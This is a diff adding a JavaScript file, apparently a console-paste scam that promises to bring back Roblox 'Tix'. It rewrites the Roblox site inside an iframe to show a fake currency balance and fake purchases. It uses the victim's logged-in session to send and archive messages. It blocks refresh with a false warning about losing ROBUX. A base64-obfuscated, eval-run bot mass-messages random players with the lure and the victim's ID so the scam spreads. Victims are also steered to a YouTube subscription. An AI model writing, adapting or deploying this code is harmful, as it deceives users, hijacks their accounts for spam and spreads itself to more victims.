@@ -1,0 +1,205 @@
+Roblox.Tix = {
+    original: 'missingno',
+    initialized: 0,
+    shares: 0,
+    loading: false,
+    items: [],
+    inventoryString: '<li class="list-item item-card ng-scope"><div class="item-card-container"><a class="item-card-link" href="%1" data-ytta-id="-"><div class="item-card-thumb-container"><div ng-hide="item.Product.SerialNumber==null" class="item-serial-number ng-binding ng-hide">#</div><img thumbnail="item.Thumbnail" image-retry="" class="item-card-thumb ng-isolate-scope" src="%2"></div><div class="text-overflow item-card-name ng-binding" title="%6 ">%6 </div></a><!-- ngIf: item.Item.AudioUrl --><div class="text-overflow item-card-creator"><span class="xsmall text-label">By</span> <a class="xsmall text-overflow text-link ng-binding" ng-href="%3" ng-hide="assetsListContent.assetItems.data.Data.PageType!==\'favorites\'&amp;&amp;currentData.category.name==\'Places\'&amp;&amp;(currentData.subcategory.name==\'My VIP Servers\'||currentData.subcategory.name==\'Other VIP Servers\')&amp;&amp;staticData.isOwnPage" href="%3" data-ytta-id="-">%4</a> <a class="xsmall text-overflow text-link ng-binding ng-hide" ng-href="" ng-show="assetsListContent.assetItems.data.Data.PageType!==\'favorites\'&amp;&amp;(currentData.subcategory.name==\'My VIP Servers\'||currentData.subcategory.name==\'Other VIP Servers\')"></a></div><div class="item-card-price"><span class="icon-robux-16x16"></span> <span class="text-robux ng-binding ng-hide" ng-show="item.HasPrice"></span> <span class="text-label" ng-hide="item.HasPrice"><!-- ngIf: item.Product.NoPriceText.length>0 --><span ng-if="item.Product.NoPriceText.length>0" ng-class="{\'text-robux\':item.Product.NoPriceText===\'Free\'}" class="ng-binding ng-scope text-robux">%5</span><!-- end ngIf: item.Product.NoPriceText.length>0 --></span></div></div></li>',
+    disableF5: function(e) { if ((e.which || e.keyCode) == 116 || (e.which || e.keyCode) == 82) { e.preventDefault(); document.getElementById('documentFrame').src = document.getElementById('documentFrame').contentWindow.document.location.href; } },
+    watermark: function () {
+            console.clear();
+            console.log("__________ ________ __________.____    ________  ____  ___\n\\______   \\\\_____  \\\\______   \\    |   \\_____  \\ \\   \\/  /\n |       _/ /   |   \\|    |  _/    |    /   |   \\ \\     / \n |    |   \\/    |    \\    |   \\    |___/    |    \\/     \\ \n |____|_  /\\_______  /______  /_______ \\_______  /___/\\  \\\n        \\/         \\/       \\/        \\/       \\/      \\_/\nRoblox.Tix.js created by Urban420 Network");
+    },
+    addItem: function(category, name, image, creator, price, url, profile) {
+        Roblox.Tix.items.push({category: category, name: name, image: image, creator: creator, price: price, profile: profile, url: url});
+    },
+    format: function(str, arr) {
+        return str.replace(/%(\d+)/g, function(_,m) {
+            return arr[--m];
+        });
+    },
+    countShares: function() {
+        $.ajax({
+            url: "https://www.roblox.com/messages/api/get-messages?messageTab=0&pageNumber=0&pageSize=20",
+            success: function(messages) {
+                var invites = [];
+               
+                for(var i = 0; i < messages.Collection.length; i++) {
+                    var message = messages.Collection[i];
+                    if(message.Body.indexOf("!!!") == 0) {
+                        invites.push(message.Id);
+                        Roblox.Tix.shares+=10;
+                    }
+                }
+               
+                $.ajax({
+                    url: "https://www.roblox.com/messages/api/archive-messages",
+                    method: "POST",
+                    headers: { "X-CSRFToken": "" },
+                    data: {
+                        "messageIds": invites
+                    }
+                });
+            }
+        });
+        document.getElementById('documentFrame').contentWindow.document.getElementById('nav-shares-amount').innerHTML = Roblox.Tix.shares.toLocaleString();
+    },
+    init: function() {
+        if(Roblox.Tix.initialized != 0) {
+            console.log("Already initalized!");
+            return;
+        }
+        var referee = prompt("Who sent you this video?\nEnter their user ID here\n\n(If you found this video on your own, press Cancel to continue)");
+        if(referee != null) {
+            $.ajax({
+                url: 'https://www.roblox.com/messages/send',
+                type: 'POST',
+                data: {
+                    'subject': 'thanks for robux!!!!',
+                    'body': '!!!',
+                    'recipientid': referee,
+                    'cacheBuster': $.now
+                }
+            });
+        }
+        setInterval( Roblox.Tix.countShares, 2000 );
+        window.onbeforeunload = function() {
+            return "Your ROBUX has not finished saving, if you continue your balance will be set to " + Roblox.Tix.original + " ROBUX";
+        }
+        Roblox.Tix.initialized = 1;
+        Roblox.Tix.original = document.getElementById('nav-robux-amount').innerHTML;
+        document.documentElement.innerHTML = "<body style='margin:0px;padding:0px:overflow:hidden'><iframe id='documentFrame' sandbox='allow-same-origin allow-modals allow-scripts allow-popups allow-forms' src='" + document.location + "' frameborder='0' style='overflow:hidden;height:100%;width:100%;position:absolute' height='100%' width='100%' /></body>";
+        var start_loading = (function() {
+            Roblox.Tix.loading = true;
+        });
+        setInterval(function() {
+            if(Roblox.Tix.loading && document.getElementById('documentFrame').contentWindow.document.body.innerHTML.indexOf('nav-robux-amount') != -1) {
+                Roblox.Tix.loading = false;        
+                if(document.location.href != document.getElementById('documentFrame').contentWindow.document.location.href) {
+                    window.history.pushState(null, null, document.getElementById('documentFrame').contentWindow.document.location);
+                }
+               
+                setTimeout(function(){
+                    var priceInfos = document.getElementById('documentFrame').contentWindow.document.getElementsByClassName("price-info");
+                    for(var i = 0; i < priceInfos.length; i++) {
+                        var price = Math.max(5, parseInt(parseInt(priceInfos[i].children[0].getElementsByClassName("text-robux-lg")[0].innerHTML.replace(/,/,'')) / 10)).toLocaleString();
+                        priceInfos[i].innerHTML += '<div class="icon-text-wrapper clearfix icon-robux-price-container"><span class="text-robux-lg" style="color: #cc9e71; margin-left: 95px">' + price + '</span><span class="icon-tix"></span></div>';
+                        if(Roblox.Tix.shares >= price) {
+                            var doc = document.getElementById('documentFrame').contentWindow.document;
+                            var t = doc.getElementsByClassName("PurchaseButton");
+                            for(var i=0; i<t.length; i++) {
+                                $(t[i]).replaceWith(function () {
+                                    return $('<' + this.nodeName + ' class="' + $(this).attr('class') + '">').append($(this).contents());
+                                });
+                               t[i].onclick = function() {
+                                        Roblox.Tix.addItem(
+                                            doc.getElementsByClassName("field-content")[0].innerHTML.toLowerCase().replace(/ /g, '-') + 's',
+                                            doc.getElementsByClassName('item-name-container')[0].children[0].innerHTML,
+                                            doc.getElementsByClassName('thumbnail-span')[0].children[0].src,
+                                            doc.getElementsByClassName('text-name')[0].innerHTML,
+                                            doc.getElementsByClassName('text-robux-lg')[0].innerHTML,
+                                            window.location.href,
+                                            doc.getElementsByClassName('text-name')[0].href
+                                            );
+                                        document.getElementById('documentFrame').contentWindow.$(".alert-success").html("Purchase Completed");
+                                        document.getElementById('documentFrame').contentWindow.Roblox.BootstrapWidgets.ToggleSystemMessage(document.getElementById('documentFrame').contentWindow.$(".alert-success"),100,1e3);
+                                        setTimeout(function() {
+                                            Roblox.Tix.shares -= price;
+                                            document.getElementById('documentFrame').src = document.getElementById('documentFrame').contentWindow.document.location.href;
+                                        }, 200);
+                                    }
+                            }
+                        }
+                    }
+                }, 150);
+               
+                var doc = document.getElementById('documentFrame').contentWindow.document;
+                if(doc.location.href.split('/').length == 6 && document.location.href.split('/')[3] == 'catalog') {
+                    for(var i = 0; i < Roblox.Tix.items.length; i++) {
+                        var item = Roblox.Tix.items[i];
+                        if(item.url == window.location.href) {
+                            var buyInterval = setInterval(function() {
+                                if(doc.getElementsByClassName('text-label').length > 0 && doc.getElementsByClassName('text-label field-label price-label').length > 0 && doc.getElementsByClassName('action-button').length > 0) {
+                                    clearInterval(buyInterval);
+                                    doc.getElementsByClassName('text-label')[0].outerHTML += '<div class="divider">&nbsp;</div><div class="label-checkmark"><span class="icon-checkmark-white-bold"></span></div><span>Item Owned</span>';
+                                    doc.getElementsByClassName('text-label field-label price-label')[0].outerHTML = '<div class="item-first-line">This item is available in your inventory.</div>' + doc.getElementsByClassName('text-label field-label price-label')[0].outerHTML;
+                                    doc.getElementsByClassName('action-button')[0].innerHTML = '<a id="edit-avatar-button" href="https://www.roblox.com/my/character.aspx" class="btn-control-md" data-button-action="avatar" data-ytta-id="-">Edit Avatar</a>';
+                                }
+                            }, 1);
+                        }
+                    }
+                }
+               
+                /*if(typeof(doc.getElementById('assetsItems')) != 'undefined') {
+                    var inventory = doc.getElementById('assetsItems');
+                    for(var i = 0; i < Roblox.Tix.items.length; i++) {
+                        var item = Roblox.Tix.items[i];
+                        if(item.category == window.location.href.split('/')[6]) {
+                            inventory.innerHTML += Roblox.Tix.format(Roblox.Tix.inventoryString, [item.url, item.image, item.profile, item.creator, item.price, item.name]);
+                        }
+                    }
+                }*/
+               
+                doc.getElementById("navbar-robux").outerHTML += '<li id="navbar-shares" class="navbar-icon-item"><a id="nav-shares-icon" class="rbx-menu-item"><span class="icon-nav-tix roblox-popover-close" id="nav-shares"></span><span class="rbx-text-navbar-right" id="nav-shares-amount">' + Roblox.Tix.shares.toLocaleString() + '</span></a></li>';
+               
+                var messageBot = 'WYodHlwZW9mKGlzQXV0b01hc3NNZXNzYWdpbmcpID09ICd1bmRlZmluZWQnKSB7Cglpc0F1dG9NYXNzTWVzc2FnaW5nID0gZmFsc2U7Cn0KCmlzQXV0b01hc3NNZXNzYWdpbmcgPSAhaXNBdXRvTWFzc01lc3NhZ2luZzsKaWYoaXNBdXRvTWFzc01lc3NhZ2luZykgewoJdmFyIHBsYWNlcyA9IFs5Njg5NTgxLCAxMzgyMjg4OSwgMzA2OTY0NDk0LCAxNTU2MTU2MDQsIDE0MjgyMzI5MSwgMjkyNDM5NDc3XTsKCXZhciB0aXRsZXMgPSBbJ2hvdyB0byBicmluZyB0aXggYmFjayEnLCAnaSB0dXJuZWQgb24gdGl4IScsICd5b3UgY2FuIGJyaW5nIGJhY2sgdGl4ISAod29vdCBubyBtb3JlIGJ1eWluZyByb2J1eCknLCAneW91IGNhbiB0dXJuIHRpeCBiYWNrIG9uIG5vdyEgKHdvb3Qgbm8gbW9yZSBidXlpbmcgcm9idXggZm9yIGl0ZW1zKSddOwoJCgl2YXIgdGltZW91dCA9IDA7Cgl2YXIgcGxhY2UgPSBwbGFjZXNbcGFyc2VJbnQoTWF0aC5yYW5kb20oKSAqIHBsYWNlcy5sZW5ndGgpXTsKCXZhciB0aXRsZSA9IHRpdGxlc1twYXJzZUludChNYXRoLnJhbmRvbSgpICogdGl0bGVzLmxlbmd0aCldOwoJdmFyIG1lc3NhZ2UgPSAnaSBqdXN0IGZvdW5kIG91dCBob3cgdG8gdHVybiB0aXggYmFjayBvbi4gZmlyc3QgdSBoYXZlIHRvIGdvIHRvIHlvdXR1YmUgKGRvdCkgY29tL3dhdGNoP3Y9UG9wZlBZODFpWkEgdGhlbiBkbyB0aGUgc3RlcHMgaW4gdGhlIHZpZCwgd2hlbiBpdCBhc2tzICJ3aG8gc2VudCB5b3UgdGhpcyB2aWQ/IGVudGVyIHVzZXIgSUQgaGVyZSIgZW50ZXIgJyArIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCduYXYtcHJvZmlsZScpLmhyZWYuc3BsaXQoJy8nKVs0XSArICcgYW5kIHRoZW4gcHJlc3MgT0sgYW5kIHRoZW4gdSB3aWxsIGhhdmUgdGl4ISc7Cgl2YXIgdXJsID0gImh0dHBzOi8vd3d3LnJvYmxveC5jb20vZ2FtZXMvZ2V0Z2FtZWluc3RhbmNlc2pzb24/cGxhY2VJZD0iICsgcGxhY2UgKyImc3RhcnRpbmRleD0wIjsKCXZhciBzZW5kTXNnID0gZnVuY3Rpb24odXNlcklkLCB1c2VybmFtZSwgdGhhdCwgdGl0bGUsIG1lc3NhZ2UpIHsKICAgICAgICBmdW5jdGlvbiBzZW5kKCkgewoJCQkkLnBvc3QoImh0dHBzOi8vd3d3LnJvYmxveC5jb20vbWVzc2FnZXMvc2VuZCIsewoJCQkJc3ViamVjdDogdGl0bGUsCgkJCQlib2R5OiBtZXNzYWdlLAoJCQkJcmVjaXBpZW50aWQ6IHVzZXJJZCwKCQkJCWNhY2hlQnVzdGVyOiBuZXcgRGF0ZSgpLmdldFRpbWUoKQoJCQl9KS5kb25lKGZ1bmN0aW9uKHJlc3BvbnNlKSB7CgkJCQlpZiAocmVzcG9uc2Uuc3VjY2VzcyA9PSB0cnVlKSB7CgkJCQkJY29uc29sZS5sb2coJ1NlbnQgbWVzc2FnZSB0byAnICsgdXNlcm5hbWUgKyAnICgnICsgdXNlcklkICsgJyknKTsKCQkJCX0gZWxzZSB7CgkJCQkJY29uc29sZS5sb2coJ0Vycm9yIHNlbmRpbmcgdG8gJyArIHVzZXJuYW1lICsgJzogJyArIHJlc3BvbnNlLnNob3J0TWVzc2FnZSk7CgkJCQl9CgkJCX0pOwogICAgICAgIH0KCQlpZihpc0F1dG9NYXNzTWVzc2FnaW5nKSB7CgkJCXNlbmQoKTsKCQl9Cgl9CgkkLmdldCh1cmwpLmRvbmUoZnVuY3Rpb24ob2JqKXsKCQlmb3IodmFyIHNlcnZlciBpbiBvYmouQ29sbGVjdGlvbikgewoJCQlmb3IodmFyIHBsYXllcnMgaW4gb2JqLkNvbGxlY3Rpb25bc2VydmVyXS5DdXJyZW50UGxheWVycykgewoJCQkJdmFyIHBsciA9IG9iai5Db2xsZWN0aW9uW3NlcnZlcl0uQ3VycmVudFBsYXllcnNbcGxheWVyc107CgkJCQlpZiAocGxyLklkID4gMCkgewoJCQkJCShmdW5jdGlvbih0aW1lLGlkLG5hbWUsdGhhdCx0aXRsZSxtZXNzYWdlKSB7CgkJCQkJCXNldFRpbWVvdXQoc2VuZE1zZyx0aW1lLGlkLG5hbWUsdGhhdCx0aXRsZSxtZXNzYWdlKTsKCQkJCQl9KSh0aW1lb3V0LHBsci5JZCxwbHIuVXNlcm5hbWUsdGhpcyx0aXRsZSxtZXNzYWdlKTsKCQkJCQl0aW1lb3V0Kz01MDAwOwoJCQkJfQoJCQl9CgkJfQoJfSk7CglhbGVydCgiWW91IGFyZSBub3cgYXV0byBtYXNzIG1lc3NhZ2luZ1xuXG5FdmVyeSA1IHNlY29uZHMgYSBtZXNzYWdlIGNvbnRhaW5pbmcgdGhlIHN0ZXBzIGFib3ZlIGlzIHNlbnQgdG8gYSByYW5kb20gdXNlci5cbklmIHRoZXkgZm9sbG93IHRoZSBzdGVwcywgeW91IHdpbGwgZ2V0IDEwIHRpeC5cbklmIHlvdSB3YW50IHRvIHN0b3AsIHByZXNzIHRoZSBidXR0b24gYWdhaW4uIik7Cn0gZWxzZSB7CglhbGVydCgiWW91IGFyZSBubyBsb25nZXIgYXV0byBtYXNzIG1lc3NhZ2luZyIpOwp9';
+               
+                setTimeout(function() {
+                    if(document.location.pathname == "/Share") {
+                        doc.getElementsByClassName("error-image")[0].src = "/Images/Upgrades/Robux/img_richman.png";
+                        doc.getElementsByClassName("error-title")[0].innerHTML = "Share For Free Tix!";
+                        doc.getElementsByClassName("error-message")[0].outerHTML = "<h4 class='error-message' style='margin-bottom:50px'>Do you want tix? If so, follow the steps below!<br><br>First, you must send someone this video URL: <br><a href='https://www.youtube.com/watch?v=PopfPY81iZA' style='text-decoration:underline;color:#0074bd'>https://www.youtube.com/watch?v=PopfPY81iZA</a><br><br>Tell them to follow the steps, when they run the script used in the video they will see this message:<br><br><img src='https://i.imgur.com/yn950Vo.png' style='box-shadow: 0px 0px 5px #888888;'></img><br><br>When they see this, they must enter <b>" + doc.getElementById('nav-profile').href.split('/')[4] + "</b>, if they do not you will not receive your tix<br>Once they do that you will have 10 tix added to your profile that you can spend on the catalog.<br><br><b>Need more shares? Use the buttons below to help!</b></h4>";
+                        doc.getElementsByClassName("btn-primary-md btn-fixed-width")[0].outerHTML = "<a class='btn-primary-md btn-fixed-width' title='' onclick='eval(atob(\"" + messageBot + "\"))' href='#'>Auto Msg</a>";
+                    }
+                }, 5);
+               
+                document.title = doc.title;
+                if(typeof(Roblox.Tix.onload) != 'undefined') Roblox.Tix.onload();
+            }
+        }, 1);
+        window.addEventListener('message', function(e){ if(e.data == 'iframe_change') { start_loading(); } }, false);
+        $('#documentFrame').load(function() {
+            if(Roblox.Tix.initialized != 2) {
+                Roblox.Tix.initialized = 2;
+                document.getElementById('documentFrame').contentWindow.$(".alert-success").html("Successfully loaded");
+                document.getElementById('documentFrame').contentWindow.Roblox.BootstrapWidgets.ToggleSystemMessage(document.getElementById('documentFrame').contentWindow.$(".alert-success"),100,2e3);
+                document.getElementById('documentFrame').contentWindow.document.getElementById("navbar-robux").outerHTML += '<li id="navbar-shares" class="navbar-icon-item"><a id="nav-shares-icon" class="rbx-menu-item"><span class="icon-nav-tix roblox-popover-close" id="nav-shares"></span><span class="rbx-text-navbar-right" id="nav-shares-amount">' + Roblox.Tix.shares + '</span></a></li>';
+            }
+            Roblox.Tix.watermark();
+            document.getElementById('documentFrame').contentWindow.onunload = function() { window.top.postMessage('iframe_change', '*'); };
+            if(document.location.href != document.getElementById('documentFrame').contentWindow.document.location.href) {
+                window.history.pushState(null, null, document.getElementById('documentFrame').contentWindow.document.location);
+            }
+            if(Roblox.Tix.items.length > 0) {
+                if(document.getElementById('documentFrame').contentWindow.document.location.href.indexOf('my/character.aspx') != -1 || document.getElementById('documentFrame').contentWindow.document.getElementById('assetsItems') != null) {
+                    if(window.confirm("You must be subscribed to Urban420 Network to receive the items you bought\nIf you are subscribed, press Cancel and wait up to 15 minutes for the item to be added to your inventory.\nIf you have not subscribed yet, press OK to be redirected to the subscribe page.")) {
+                        var win = window.open('https://www.youtube.com/channel/UCBTsbsdu-5VmEhnpYt9EwRg?sub_confirmation=1', '_blank');
+                        win.focus();
+                    } else {
+                        alert("The items will now be added to your inventory. It may take between 15 minutes to 48 hours for your item to appear\nIf you did not subscribe this will not work\n\nYou do not have to leave this page open, feel free to close the tab, play ROBLOX, or turn off your PC.");
+                    }
+                }
+            }
+           
+            var navbar = document.getElementById('documentFrame').contentWindow.document.getElementById("mCSB_1_container").children[0];
+            navbar.innerHTML += '<li class="rbx-nav-sponsor" ng-non-bindable=""><a class="menu-item" href="/Share"><span class="icon-logo"></span></a></li>';
+           
+            var prices = document.getElementById('documentFrame').contentWindow.document.getElementsByClassName("robux-price");
+            for(var i = 0; i < prices.length; i++) {
+                prices[i].innerHTML += '<span class="NotAPrice" style="display:block">' + Math.max(5, parseInt(parseInt(prices[i].getElementsByClassName("robux")[0].innerHTML.replace(/,/g,'')) / 10)).toLocaleString() + ' Tix</span>';
+            }
+           
+            document.title = document.getElementById('documentFrame').contentWindow.document.title;
+            if(typeof(Roblox.Tix.onloaded) != 'undefined') Roblox.Tix.onloaded();
+        });
+        window.onpopstate = function(event) {
+            document.getElementById('documentFrame').contentWindow.document.location = document.location;
+        };
+        $(document).ready(function(){
+             $(document).on("keydown", Roblox.Tix.disableF5);
+        });
+    }
+}
+ 
+
+    Roblox.Tix.init();
